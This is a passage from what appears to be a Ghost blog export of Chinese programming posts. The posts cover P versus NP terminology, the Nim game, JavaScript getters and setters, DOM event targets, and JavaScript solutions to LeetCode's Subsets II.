给定一个问题的描述作为输入，图灵机求解的过程。 此过程有可能无 限步长，则图灵机永远不会停止，除非被外部力量终止。\\n* Polynomial algorithm: 多项式算法。 如果给定问题输入的长度，常量n, 则如果图灵机 解答过程需要的是时间是以n为变量的多项式，则这个解法（也是个算法）是有多项式的时 间复杂度的。\\n* Decision question: 判定问题。 答案是yes或者no的问题\\n\\nP问题和NP问题\\n\\n* P问题 (Polynomial Solvable): 如果一个判定问题是P问题，则这个问题存在一个多项式解法。 即图灵机只需要多项式时间 就可以得到答案, 既回答yes或者no。\\n* NP问题(Nondeterminstic Polynomial Solvable): 如果一个判定问题是NP问题， 则这个问题的一个可能的解，可以在多项式时间内被验证是 否正确。 其实这不是本来的定义。 本来的定义是，NP问题是非确定性图灵机有多项式解。 但我们可以把非确定性图灵机多项多可解转化成确定性图灵机多项式可验证解。 确定性 图灵机更好好理解，所以用那个定义。\\n* P问题是确定性图灵机在多项式时间内求到解，NP问题是非确定性图灵机在多项式时间内求 到解，或者说NP问题是确定性图灵机在多项式时间内验证解.\\n* P 属于 NP。 就是说，一个问题如果属于P， 则一定属于NP。 (这里P, NP表示符合定义的 相关问题的集合) 反过来则不一定，7大数学世纪难题之一就是问 P是否等于NP。\\n\\nNPC 和 NP-hard\\n\\n* NPC, 即NP完全性问题(NP-complete)。 是指NP问题中的最难的问题。 即还没有找到多项式解法，但多项式可验证。 而且只要一个NPC问题有多项式解法，其它所有NP问题都会有一个多项式解法。\\n* NP-hard是指所有还没有找到多项式解法的问题, 并没有限定属于NP。 所以NP-hard比 NPC范围更大，也会更难。 NPC是NP-hard和NP的交集.\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>P: Polynomial Solvable<br>\nNP: Non-determinstic Polynomial Solvable<br>\n词语解释：</p>\n<ul>\n<li>Polynomial 【数】多项式的； 由平方，立方等常数次方或者更小的运算符和+,-,*,/等构成的式子及其这种式子的和</li>\n<li>Non-deterministic: 非确定性的（如：时间复杂度为O(n^logn)、O(n!)、O(2^n))<br>\nTuring-machine: 图灵机; 英国数学家图灵提出的计算模型, 一个两端无限长的由小格子组 成的带子，每个格子可以存储一个数，一个可以在带子左右移动的游标或者指针或者不如叫 磁头(head), 磁头可读或修改格子里的数。 下面默认说的是确定性图灵机，和非确定性图 灵机功能上等价</li>\n<li>Algorithm: 算法。 给定一个问题的描述作为输入，图灵机求解的过程。 此过程有可能无 限步长，则图灵机永远不会停止，除非被外部力量终止。</li>\n<li>Polynomial algorithm: 多项式算法。 如果给定问题输入的长度，常量n, 则如果图灵机 解答过程需要的是时间是以n为变量的多项式，则这个解法（也是个算法）是有多项式的时 间复杂度的。</li>\n<li>Decision question: 判定问题。 答案是yes或者no的问题</li>\n</ul>\n<p>P问题和NP问题</p>\n<ul>\n<li>P问题 (Polynomial Solvable): 如果一个判定问题是P问题，则这个问题存在一个多项式解法。 即图灵机只需要多项式时间 就可以得到答案, 既回答yes或者no。</li>\n<li>NP问题(Nondeterminstic Polynomial Solvable): 如果一个判定问题是NP问题， 则这个问题的一个可能的解，可以在多项式时间内被验证是 否正确。 其实这不是本来的定义。 本来的定义是，NP问题是非确定性图灵机有多项式解。 但我们可以把非确定性图灵机多项多可解转化成确定性图灵机多项式可验证解。 确定性 图灵机更好好理解，所以用那个定义。</li>\n<li>P问题是确定性图灵机在多项式时间内求到解，NP问题是非确定性图灵机在多项式时间内求 到解，或者说NP问题是确定性图灵机在多项式时间内验证解.</li>\n<li>P 属于 NP。 就是说，一个问题如果属于P， 则一定属于NP。 (这里P, NP表示符合定义的 相关问题的集合) 反过来则不一定，7大数学世纪难题之一就是问 P是否等于NP。</li>\n</ul>\n<p>NPC 和 NP-hard</p>\n<ul>\n<li>NPC, 即NP完全性问题(NP-complete)。 是指NP问题中的最难的问题。 即还没有找到多项式解法，但多项式可验证。 而且只要一个NPC问题有多项式解法，其它所有NP问题都会有一个多项式解法。</li>\n<li>NP-hard是指所有还没有找到多项式解法的问题, 并没有限定属于NP。 所以NP-hard比 NPC范围更大，也会更难。 NPC是NP-hard和NP的交集.</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"10","plaintext":"P: Polynomial Solvable\nNP: Non-determinstic Polynomial Solvable\n词语解释：\n\n * Polynomial 【数】多项式的； 由平方，立方等常数次方或者更小的运算符和+,-,*,/等构成的式子及其这种式子的和\n * Non-deterministic: 非确定性的（如：时间复杂度为O(n^logn)、O(n!)、O(2^n))\n   Turing-machine: 图灵机; 英国数学家图灵提出的计算模型, 一个两端无限长的由小格子组\n   成的带子，每个格子可以存储一个数，一个可以在带子左右移动的游标或者指针或者不如叫 磁头(head), 磁头可读或修改格子里的数。\n   下面默认说的是确定性图灵机，和非确定性图 灵机功能上等价\n * Algorithm: 算法。 给定一个问题的描述作为输入，图灵机求解的过程。 此过程有可能无 限步长，则图灵机永远不会停止，除非被外部力量终止。\n * Polynomial algorithm: 多项式算法。 如果给定问题输入的长度，常量n, 则如果图灵机\n   解答过程需要的是时间是以n为变量的多项式，则这个解法（也是个算法）是有多项式的时 间复杂度的。\n * Decision question: 判定问题。 答案是yes或者no的问题\n\nP问题和NP问题\n\n * P问题 (Polynomial Solvable): 如果一个判定问题是P问题，则这个问题存在一个多项式解法。 即图灵机只需要多项式时间 就可以得到答案,\n   既回答yes或者no。\n * NP问题(Nondeterminstic Polynomial Solvable): 如果一个判定问题是NP问题，\n   则这个问题的一个可能的解，可以在多项式时间内被验证是 否正确。 其实这不是本来的定义。 本来的定义是，NP问题是非确定性图灵机有多项式解。\n   但我们可以把非确定性图灵机多项多可解转化成确定性图灵机多项式可验证解。 确定性 图灵机更好好理解，所以用那个定义。\n * P问题是确定性图灵机在多项式时间内求到解，NP问题是非确定性图灵机在多项式时间内求 到解，或者说NP问题是确定性图灵机在多项式时间内验证解.\n * P 属于 NP。 就是说，一个问题如果属于P， 则一定属于NP。 (这里P, NP表示符合定义的 相关问题的集合)\n   反过来则不一定，7大数学世纪难题之一就是问 P是否等于NP。\n\nNPC 和 NP-hard\n\n * NPC, 即NP完全性问题(NP-complete)。 是指NP问题中的最难的问题。 即还没有找到多项式解法，但多项式可验证。\n   而且只要一个NPC问题有多项式解法，其它所有NP问题都会有一个多项式解法。\n * NP-hard是指所有还没有找到多项式解法的问题, 并没有限定属于NP。 所以NP-hard比 NPC范围更大，也会更难。\n   NPC是NP-hard和NP的交集.","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-18T06:29:52.000Z","created_by":"1","updated_at":"2017-01-17T07:09:34.000Z","updated_by":"1","published_at":"2016-02-18T06:35:35.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2cb","uuid":"cba5a58c-3c61-489d-a2ff-c13bcbfb529e","title":"Nim Game(尼姆游戏)--LeetCode","slug":"nim-game-ni-mu-you-xi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"You are playing the following Nim Game with your friend: There is a heap of stones on the table, each time one of you take turns to remove 1 to 3 stones. The one who removes the last stone will be the winner. You will take the first turn to remove the stones.\\n\\nBoth of you are very clever and have optimal strategies for the game. Write a function to determine whether you can win the game given the number of stones in the heap.\\n\\nFor example, if there are 4 stones in the heap, then you will never win the game: no matter 1, 2, or 3 stones you remove, the last stone will always be removed by your friend.\\n博弈论中极为经典的尼姆游戏。有总数为n的石头，每个人可以拿1~3(m)个石头，两个人交替拿，拿到最后一个的人获胜。究竟是先手有利，还是后手有利？\\n```\\nfunction Nim(n){    //对于先手来说。  \\n   if(n%4===0){return \\\"输\\\";}\\n   else{return \\\"赢\\\";}\\n}\\n```\\n先手有利。只有n被4整除时，才会输。\\n\\n* 假设有1颗石头。 先手赢\\n* 假设有2颗石头。 先手赢\\n* 假设有3颗石头。 先手赢\\n* 假设有4颗石头。 后手赢\\n* 假设有5颗石头。 先手赢（5=1+4，先拿1个，不管别人拿1~3个,总会留下3~1个。）\\n\\n得出结论，要赢就要留4个给对手选择。这样必赢。\\n\\n递推：要赢就要留`4*N`个给对手选择。这样必赢。（不管对手选q`[1-3]{1}`个，自己选`4-q`个就行，保证留下最后`4`个。）\\n\\n因此，先手，在`4*N+1`或`4*N+2`或`4*N+3`颗石头时，必赢。在`4N`时，输。所以，先手优势。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>You are playing the following Nim Game with your friend: There is a heap of stones on the table, each time one of you take turns to remove 1 to 3 stones. The one who removes the last stone will be the winner. You will take the first turn to remove the stones.</p>\n<p>Both of you are very clever and have optimal strategies for the game. Write a function to determine whether you can win the game given the number of stones in the heap.</p>\n<p>For example, if there are 4 stones in the heap, then you will never win the game: no matter 1, 2, or 3 stones you remove, the last stone will always be removed by your friend.<br>\n博弈论中极为经典的尼姆游戏。有总数为n的石头，每个人可以拿1~3(m)个石头，两个人交替拿，拿到最后一个的人获胜。究竟是先手有利，还是后手有利？</p>\n<pre><code>function Nim(n){    //对于先手来说。  \n   if(n%4===0){return &quot;输&quot;;}\n   else{return &quot;赢&quot;;}\n}\n</code></pre>\n<p>先手有利。只有n被4整除时，才会输。</p>\n<ul>\n<li>假设有1颗石头。 先手赢</li>\n<li>假设有2颗石头。 先手赢</li>\n<li>假设有3颗石头。 先手赢</li>\n<li>假设有4颗石头。 后手赢</li>\n<li>假设有5颗石头。 先手赢（5=1+4，先拿1个，不管别人拿1~3个,总会留下3~1个。）</li>\n</ul>\n<p>得出结论，要赢就要留4个给对手选择。这样必赢。</p>\n<p>递推：要赢就要留<code>4*N</code>个给对手选择。这样必赢。（不管对手选q<code>[1-3]{1}</code>个，自己选<code>4-q</code>个就行，保证留下最后<code>4</code>个。）</p>\n<p>因此，先手，在<code>4*N+1</code>或<code>4*N+2</code>或<code>4*N+3</code>颗石头时，必赢。在<code>4N</code>时，输。所以，先手优势。</p>\n<!--kg-card-end: markdown-->","comment_id":"11","plaintext":"You are playing the following Nim Game with your friend: There is a heap of\nstones on the table, each time one of you take turns to remove 1 to 3 stones.\nThe one who removes the last stone will be the winner. You will take the first\nturn to remove the stones.\n\nBoth of you are very clever and have optimal strategies for the game. Write a\nfunction to determine whether you can win the game given the number of stones in\nthe heap.\n\nFor example, if there are 4 stones in the heap, then you will never win the\ngame: no matter 1, 2, or 3 stones you remove, the last stone will always be\nremoved by your friend.\n博弈论中极为经典的尼姆游戏。有总数为n的石头，每个人可以拿1~3(m)个石头，两个人交替拿，拿到最后一个的人获胜。究竟是先手有利，还是后手有利？\n\nfunction Nim(n){    //对于先手来说。  \n   if(n%4===0){return \"输\";}\n   else{return \"赢\";}\n}\n\n\n先手有利。只有n被4整除时，才会输。\n\n * 假设有1颗石头。 先手赢\n * 假设有2颗石头。 先手赢\n * 假设有3颗石头。 先手赢\n * 假设有4颗石头。 后手赢\n * 假设有5颗石头。 先手赢（5=1+4，先拿1个，不管别人拿1~3个,总会留下3~1个。）\n\n得出结论，要赢就要留4个给对手选择。这样必赢。\n\n递推：要赢就要留4*N个给对手选择。这样必赢。（不管对手选q[1-3]{1}个，自己选4-q个就行，保证留下最后4个。）\n\n因此，先手，在4*N+1或4*N+2或4*N+3颗石头时，必赢。在4N时，输。所以，先手优势。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-19T03:49:10.000Z","created_by":"1","updated_at":"2017-01-17T07:05:52.000Z","updated_by":"1","published_at":"2016-02-19T03:59:07.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2cc","uuid":"8a5ae291-f707-469c-a267-560bb08bee8d","title":"js中的get;set;","slug":"jszhong-de-get-set","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"ES5之前：\\n```\\nvar pp = {  \\n        _name : \\\"jeapedu\\\",\\n        set name(v){\\n                this._name = v;\\n        },\\n        get name(){\\n                return this._name;\\n        }\\n}\\npp.name = \\\"China\\\";  \\nconsole.log(pp.name);  \\n/////////////////////////////////或\\nObject.prototype.__defineGetter__.call(obj, propName, getter);  \\nObject.prototype.__defineSetter__.call(obj, propName, setter);  \\n这样写也行\\npp.__defineGetter__('name', function(){return this._name});  \\npp.__defineSetter__('name', function(x){this._name=x});\\n\\n```\\nES5:\\n```\\n    Object.defineProperty( obj, \\\"value\\\", {\\n        // value: true,\\n        // writable: false,\\n        enumerable: true,\\n        configurable: true,\\n        get: function() {\\n            return value;\\n        },\\n        set: function(v) {\\n            value = v;\\n        }\\n    });\\n```\\n* configurable：默认false，表示此属性是否可用delete删除\\n* enumerable: 默认为false，表示此属性是否可被for...in、Object.keys遍历到\\n* value：默认undefined，此属性的值，可以是任何JavaScript类型\\n* writable：默认为false，此属性是否可被改写(为false时，不能和set在一起,有set时，默认为true。)\\n* get：默认undefined，指定一个函数，当属性被调用时，此函数也被调用，默认为返回属性值\\n* set：默认undefined，指定一个函数，当属性被赋值时，此函数也被调用，仅接受一个参数，参数为属性被赋的值\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>ES5之前：</p>\n<pre><code>var pp = {  \n        _name : &quot;jeapedu&quot;,\n        set name(v){\n                this._name = v;\n        },\n        get name(){\n                return this._name;\n        }\n}\npp.name = &quot;China&quot;;  \nconsole.log(pp.name);  \n/////////////////////////////////或\nObject.prototype.__defineGetter__.call(obj, propName, getter);  \nObject.prototype.__defineSetter__.call(obj, propName, setter);  \n这样写也行\npp.__defineGetter__('name', function(){return this._name});  \npp.__defineSetter__('name', function(x){this._name=x});\n\n</code></pre>\n<p>ES5:</p>\n<pre><code>    Object.defineProperty( obj, &quot;value&quot;, {\n        // value: true,\n        // writable: false,\n        enumerable: true,\n        configurable: true,\n        get: function() {\n            return value;\n        },\n        set: function(v) {\n            value = v;\n        }\n    });\n</code></pre>\n<ul>\n<li>configurable：默认false，表示此属性是否可用delete删除</li>\n<li>enumerable: 默认为false，表示此属性是否可被for...in、Object.keys遍历到</li>\n<li>value：默认undefined，此属性的值，可以是任何JavaScript类型</li>\n<li>writable：默认为false，此属性是否可被改写(为false时，不能和set在一起,有set时，默认为true。)</li>\n<li>get：默认undefined，指定一个函数，当属性被调用时，此函数也被调用，默认为返回属性值</li>\n<li>set：默认undefined，指定一个函数，当属性被赋值时，此函数也被调用，仅接受一个参数，参数为属性被赋的值</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"12","plaintext":"ES5之前：\n\nvar pp = {  \n        _name : \"jeapedu\",\n        set name(v){\n                this._name = v;\n        },\n        get name(){\n                return this._name;\n        }\n}\npp.name = \"China\";  \nconsole.log(pp.name);  \n/////////////////////////////////或\nObject.prototype.__defineGetter__.call(obj, propName, getter);  \nObject.prototype.__defineSetter__.call(obj, propName, setter);  \n这样写也行\npp.__defineGetter__('name', function(){return this._name});  \npp.__defineSetter__('name', function(x){this._name=x});\n\n\n\nES5:\n\n    Object.defineProperty( obj, \"value\", {\n        // value: true,\n        // writable: false,\n        enumerable: true,\n        configurable: true,\n        get: function() {\n            return value;\n        },\n        set: function(v) {\n            value = v;\n        }\n    });\n\n\n * configurable：默认false，表示此属性是否可用delete删除\n * enumerable: 默认为false，表示此属性是否可被for...in、Object.keys遍历到\n * value：默认undefined，此属性的值，可以是任何JavaScript类型\n * writable：默认为false，此属性是否可被改写(为false时，不能和set在一起,有set时，默认为true。)\n * get：默认undefined，指定一个函数，当属性被调用时，此函数也被调用，默认为返回属性值\n * set：默认undefined，指定一个函数，当属性被赋值时，此函数也被调用，仅接受一个参数，参数为属性被赋的值","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-22T05:04:28.000Z","created_by":"1","updated_at":"2017-01-17T07:03:31.000Z","updated_by":"1","published_at":"2016-02-22T05:39:36.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2cd","uuid":"48ce316b-212e-4f9f-a6ef-efc65bdf9700","title":"e.target、e.srcElement、currentTarget、this的使用问题","slug":"e-target-e-srcelement-currenttarget-thisde-shi-yong-wen-ti","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> ####e.target、e.srcElement：指触发事件的源\\n\\n* srcElement是IE下的属性\\n* target是Firefox下的属性\\n* Chrome浏览器同时有这两个属性\\n\\n> ####currentTarget、this： 注册的dom\\n\\n<table id=\\\"cs\\\" border=\\\"1\\\" style=\\\"border-collapse:collapse;\\\">\\n    <tbody>\\n    <tr>\\n        <td>1</td><td>2</td><td>3</td>\\n    </tr>\\n    <tr>\\n        <td>4</td><td>5</td><td>6</td>\\n    </tr>\\n    <tr>\\n        <td>7</td><td>8</td><td>9</td>\\n    </tr>\\n    </tbody>\\n</table>\\n\\n```\\n<script>\\n  var cs=  document.getElementById('cs')\\n    cs.addEventListener('click',function(e){\\n        console.log('e.target',e.target)\\n        console.log('e.srcElement',e.srcElement)\\n        console.log('e.currentTarget',e.currentTarget)\\n        console.log('this',this)\\n    },false)\\n</script>\\n```\\n<script>\\n  var cs=  document.getElementById('cs')\\n    cs.addEventListener('click',function(e){\\n        console.log('e.target',e.target)\\n        console.log('e.srcElement',e.srcElement)\\n        console.log('e.currentTarget',e.currentTarget)\\n        console.log('this',this)\\n    },false)\\n</script>\\n按F12看控制台，点击表格。输出如下： \\n![](/content/images/2016/03/-5JR6-GOG2-0U--QLP-EJ93.png)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<h4 id=\"etargetesrcelement\">e.target、e.srcElement：指触发事件的源</h4>\n</blockquote>\n<ul>\n<li>srcElement是IE下的属性</li>\n<li>target是Firefox下的属性</li>\n<li>Chrome浏览器同时有这两个属性</li>\n</ul>\n<blockquote>\n<h4 id=\"currenttargetthisdom\">currentTarget、this： 注册的dom</h4>\n</blockquote>\n<table id=\"cs\" border=\"1\" style=\"border-collapse:collapse;\">\n    <tbody>\n    <tr>\n        <td>1</td><td>2</td><td>3</td>\n    </tr>\n    <tr>\n        <td>4</td><td>5</td><td>6</td>\n    </tr>\n    <tr>\n        <td>7</td><td>8</td><td>9</td>\n    </tr>\n    </tbody>\n</table>\n<pre><code>&lt;script&gt;\n  var cs=  document.getElementById('cs')\n    cs.addEventListener('click',function(e){\n        console.log('e.target',e.target)\n        console.log('e.srcElement',e.srcElement)\n        console.log('e.currentTarget',e.currentTarget)\n        console.log('this',this)\n    },false)\n&lt;/script&gt;\n</code></pre>\n<script>\n  var cs=  document.getElementById('cs')\n    cs.addEventListener('click',function(e){\n        console.log('e.target',e.target)\n        console.log('e.srcElement',e.srcElement)\n        console.log('e.currentTarget',e.currentTarget)\n        console.log('this',this)\n    },false)\n</script>\n<p>按F12看控制台，点击表格。输出如下：<br>\n<img src=\"/content/images/2016/03/-5JR6-GOG2-0U--QLP-EJ93.png\" alt=\"\"></p>\n<!--kg-card-end: markdown-->","comment_id":"14","plaintext":"> e.target、e.srcElement：指触发事件的源\n\n * srcElement是IE下的属性\n * target是Firefox下的属性\n * Chrome浏览器同时有这两个属性\n\n> currentTarget、this： 注册的dom\n\n123 456 789 <script>\n  var cs=  document.getElementById('cs')\n    cs.addEventListener('click',function(e){\n        console.log('e.target',e.target)\n        console.log('e.srcElement',e.srcElement)\n        console.log('e.currentTarget',e.currentTarget)\n        console.log('this',this)\n    },false)\n</script>\n\n\n按F12看控制台，点击表格。输出如下：","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-22T08:27:14.000Z","created_by":"1","updated_at":"2017-01-17T06:53:33.000Z","updated_by":"1","published_at":"2016-03-10T10:25:21.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ce","uuid":"93835273-44f3-4d2d-9c51-70d9b68da31a","title":"90. Subsets II--LeetCode","slug":"90-subsets-ii","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```Given a collection of integers that might contain duplicates, nums, return all possible subsets.\\n\\nNote:\\nElements in a subset must be in non-descending order.\\nThe solution set must not contain duplicate subsets.\\nFor example,\\nIf nums = [1,2,2], a solution is:\\n\\n[\\n  [2],\\n  [1],\\n  [1,2,2],\\n  [2,2],\\n  [1,2],\\n  []\\n]\\n就是求子集。子集中的元素，从小到大。\\n```\\n分析nums=[1,2,2]：递归树\\n```\\n第一步 选择还是不选nums[0]:               [][1]\\n第二步 选择还是不选nums[1]:       [][2]          [1][1,2]\\n第三步 选择还是不选nums[2] : [][2]  [2][2,2]  [1][1,2]    [1,2][1,2,2] \\n最后最后一共2^3=8个解，[2][1,2]重复。6个解，\\n\\n发现第二步和第三步产生了，重复分枝；\\n         [][2]\\n    [][2]    [2][2,2] \\n可以在这个时候合并。变成[] [2] [2,2]\\n最后:[][1]  +  [] [2] [2,2]\\n[][2][2,2]    [1][1,2][1,2,2]\\n在出现大量重复相同元素，可以明显缩小运算规模。\\n由于，leetcode要求排序。排序方法采用快排。\\n```\\n自己写的，递归树加剪枝。一步步合并相同的分枝。[0,1,1,1,1]这种。\\n```\\n           var subsetsWithDup = function(nums) {\\n            var  results=[];\\n            Array.prototype.quickSort=function(f){\\n                var fn=f;;\\n                if(f==null){\\n                    fn=function(a,b){return a-b;}\\n                }//快排\\n                var arr=this;\\n                if (arr.length <= 1) { return arr; }\\n                var index= Math.floor(arr.length/2);\\n                //   var pivot = arr.splice(index,1)[0];\\n                var pivot = arr[index];\\n                var left=[];\\n                var right=[];\\n                for(var i=0;i<arr.length;i++){\\n                    if(i==index){continue;}\\n                    if(fn(arr[i],pivot)>0){right.push(arr[i])}\\n                    else{left.push(arr[i])}\\n                }\\n                return left.quickSort(fn).concat([pivot], right.quickSort(fn));\\n            };\\n            function isSame(a,b){\\n                try{\\n                    if(a.length!=b.length){return false;}\\n                    for(var i=0;i< a.length;i++){\\n                        if(a[i].constructor==Array){\\n                            if(isSame(a[i],b[i])){continue;}\\n                            else{return false;}\\n                        }\\n                        if(a[i]==b[i]){continue;}\\n                        else{return false;}\\n                    }\\n                    return true;\\n                }catch(e){\\n                    return false;\\n                }\\n            }\\n            function he(a,b){\\n                var temp=[];var same;\\n                for(var i=0;i< a.length;i++){\\n                    if(isSame(same,a[i])){continue;}\\n                    same=a[i];\\n                    for(var j=0;j< b.length;j++){\\n                        temp.push(a[i].concat(b[j]));\\n                    }\\n                }\\n                //             console.log(temp);\\n                return temp;\\n            }\\n            for(var i=0;i<nums.length;i++){\\n                if(nums.length==0){break;}\\n                var temp = []\\n                var Num=nums.splice(i,1);\\n                i--;\\n                temp.push([[],Num]);\\n                for(var j=0;j<nums.length;j++){\\n                    if(Num==nums[j]){\\n                        temp.push([[],nums.splice(j,1)]);\\n                        j--;\\n                    }\\n                }\\n                //         console.log(temp);\\n                for(var k=0;k<temp.length;k++){\\n                    if(k>0){\\n                        temp[k]= he(temp[k-1],temp[k]);\\n                    }\\n                }\\n                var same;\\n                var rsult=temp[temp.length-1]\\n                for(var p=0;p<rsult.length;p++){\\n                    if(isSame(same,rsult[p])){ rsult.splice(p,1);p--;}\\n                    same=rsult[p];\\n                }\\n                //        console.log(rsult);\\n                results.push(rsult)\\n            }\\n          results=  results.quickSort(function(a,b){return a[1]-b[1];})\\n            for(var z=0;z<results.length;z++){\\n                if(z>0) {\\n                    results[z] = he(results[z - 1], results[z])\\n                }\\n            }\\n            console.log(results[results.length-1]);\\n            return results[results.length-1]\\n        };//Runtime:216 ms\\n```\\n只用递归树的。到最后合并相同的解2^n。看了下leetcode上面的输入规模小，不用剪枝更快。只有在大量相同的元素时，才会大量产生相同分枝，需要剪枝。\\n```\\n        var subsetsWithDup = function(nums) {\\n            var  results=[];\\n            Array.prototype.quickSort=function(f){\\n                var fn=f;;\\n                if(f==null){\\n                    fn=function(a,b){return a-b;}\\n                }//快排\\n                var arr=this;\\n                if (arr.length <= 1) { return arr; }\\n                var index= Math.floor(arr.length/2);\\n                //   var pivot = arr.splice(index,1)[0];\\n                var pivot = arr[index];\\n                var left=[];\\n                var right=[];\\n                for(var i=0;i<arr.length;i++){\\n                    if(i==index){continue;}\\n                    if(fn(arr[i],pivot)>0){right.push(arr[i])}\\n                    else{left.push(arr[i])}\\n                }\\n                return left.quickSort(fn).concat([pivot], right.quickSort(fn));\\n            };\\n            function isSame(a,b){\\n                try{\\n                    if(a.length!=b.length){return false;}\\n                    for(var i=0;i< a.length;i++){\\n                        if(a[i].constructor==Array){\\n                            if(isSame(a[i],b[i])){continue;}\\n                            else{return false;}\\n                        }\\n                        if(a[i]==b[i]){continue;}\\n                        else{return false;}\\n                    }\\n                    return true;\\n                }catch(e){\\n                    return false;\\n                }\\n            }\\n            function he(a,b){\\n                var temp=[];var same;\\n\\n                for(var i=0;i< a.length;i++){\\n                    if(isSame(same,a[i])){continue;}\\n                    same=a[i];\\n                    for(var j=0;j< b.length;j++){\\n                        temp.push(a[i].concat(b[j]));\\n                    }\\n                }\\n                //             console.log(temp);\\n                return temp;\\n            }\\n            nums=nums.quickSort();\\n            var temp = [];\\n            for(var i=0;i<nums.length;i++){\\n                if(nums.length==0){break;}\\n                var Num=nums.slice(i,i+1);\\n                temp.push([[],Num]);\\n                if(i>0) {\\n                    temp[i] = he(temp[i - 1], temp[i])\\n                }\\n            }\\n     //      console.log(temp[temp.length-1])\\n            var same;\\n            var rsult=temp[temp.length-1]\\n            for(var p=0;p<rsult.length;p++){\\n                if(isSame(same,rsult[p])){ rsult.splice(p,1);p--;}\\n                same=rsult[p];\\n            }\\n        //    console.log(rsult)\\n            return rsult;\\n\\n        };//Runtime: 112 ms 超过100%的javascript代码。好假\\n```\\n用WebWorker做测试。\\n```\\n        var w1 =new Worker(\\\"Subsets1.js\\\");\\n        var w2 =new Worker(\\\"Subsets2.js\\\");\\n\\n        w1.onmessage =function(evt){\\n            //接收worker传过来的数据函数\\n            console.log(evt.data);\\n            //输出worker发送来的数据\\n        }\\n\\n        w2.onmessage =function(evt){\\n            //接收worker传过来的数据函数\\n            console.log(evt.data);\\n        }\\n\\n```\\n* 输入[4,1,0]时。2先完成 \\n![](/content/images/2016/02/YS-6P0_KOC-JBWOS-5VP-Y6.png)\\n* 输入[4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,1,0]时。1先完成 \\n![](/content/images/2016/02/KY3_6Y-DBP-6--ZZCGBDWJ8.png)\\n证明只有在大量相同的元素时，剪枝还是有点用的。。。。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code class=\"language-Given\">\nNote:\nElements in a subset must be in non-descending order.\nThe solution set must not contain duplicate subsets.\nFor example,\nIf nums = [1,2,2], a solution is:\n\n[\n  [2],\n  [1],\n  [1,2,2],\n  [2,2],\n  [1,2],\n  []\n]\n就是求子集。子集中的元素，从小到大。\n</code></pre>\n<p>分析nums=[1,2,2]：递归树</p>\n<pre><code>第一步 选择还是不选nums[0]:               [][1]\n第二步 选择还是不选nums[1]:       [][2]          [1][1,2]\n第三步 选择还是不选nums[2] : [][2]  [2][2,2]  [1][1,2]    [1,2][1,2,2] \n最后最后一共2^3=8个解，[2][1,2]重复。6个解，\n\n发现第二步和第三步产生了，重复分枝；\n         [][2]\n    [][2]    [2][2,2] \n可以在这个时候合并。变成[] [2] [2,2]\n最后:[][1]  +  [] [2] [2,2]\n[][2][2,2]    [1][1,2][1,2,2]\n在出现大量重复相同元素，可以明显缩小运算规模。\n由于，leetcode要求排序。排序方法采用快排。\n</code></pre>\n<p>自己写的，递归树加剪枝。一步步合并相同的分枝。[0,1,1,1,1]这种。</p>\n<pre><code>           var subsetsWithDup = function(nums) {\n            var  results=[];\n            Array.prototype.quickSort=function(f){\n                var fn=f;;\n                if(f==null){\n                    fn=function(a,b){return a-b;}\n                }//快排\n                var arr=this;\n                if (arr.length &lt;= 1) { return arr; }\n                var index= Math.floor(arr.length/2);\n                //   var pivot = arr.splice(index,1)[0];\n                var pivot = arr[index];\n                var left=[];\n                var right=[];\n                for(var i=0;i&lt;arr.length;i++){\n                    if(i==index){continue;}\n                    if(fn(arr[i],pivot)&gt;0){right.push(arr[i])}\n                    else{left.push(arr[i])}\n                }\n                return left.quickSort(fn).concat([pivot], right.quickSort(fn));\n            };\n            function isSame(a,b){\n                try{\n                    if(a.length!=b.length){return false;}\n                    for(var i=0;i&lt; a.length;i++){\n                        if(a[i].constructor==Array){\n                            if(isSame(a[i],b[i])){continue;}\n                            else{return false;}\n                        }\n                        if(a[i]==b[i]){continue;}\n                        else{return false;}\n                    }\n                    return true;\n                }catch(e){\n                    return false;\n                }\n            }\n            function he(a,b){\n                var temp=[];var same;\n                for(var i=0;i&lt; a.length;i++){\n                    if(isSame(same,a[i])){continue;}\n                    same=a[i];\n                    for(var j=0;j&lt; b.length;j++){\n                        temp.push(a[i].concat(b[j]));\n                    }\n                }\n                //             console.log(temp);\n                return 